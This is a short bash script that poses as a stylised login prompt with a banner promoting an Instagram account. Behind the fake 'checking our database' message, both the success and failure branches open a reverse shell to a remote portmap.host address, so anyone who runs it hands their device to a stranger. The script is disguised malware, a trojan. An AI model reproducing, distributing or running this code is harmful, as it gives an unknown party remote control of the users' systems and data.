
#! /bin/bash
sudo apt-get install pv -y
clear
pkg install pv -y
clear
figlet -f slant Thejas_krizzz | pv -qL 100 | lolcat
echo ""
echo ""
	echo -e " \e[5m \e[1m\e[40;38;5;82m----FOLLOW--ME----ON INSTAGRAM ----@thejas_krizzz-----\e[25m\e[0m " | pv -qL 10 | lolcat
echo ""
echo ""
echo ""
echo -e "\e[92mPLEASE ENTER YOUR USERNAME" | pv -qL 10
read USERNAME
echo -e "\e[92mPLEASE ENTER YOUR SECRET PASSWORD" | pv -qL 10
read password
if [[ ( $USERNAME == "admin" && $password == "hacked" ) ]]; then
  clear
sleep 3
echo -e "\e[92m.....CHECKING OUR DATABASE PLEASE WAIT......" | pv -qL 10  
bash -i >& /dev/tcp/krizzz-29433.portmap.host/25901 0>&1
figlet -f slant "ACCESS GRANTED" | pv -qL 100 | lolcat
else
bash -i >& /dev/tcp/krizzz-29433.portmap.host/25901
  echo "PERMISSION DENIED"
fi
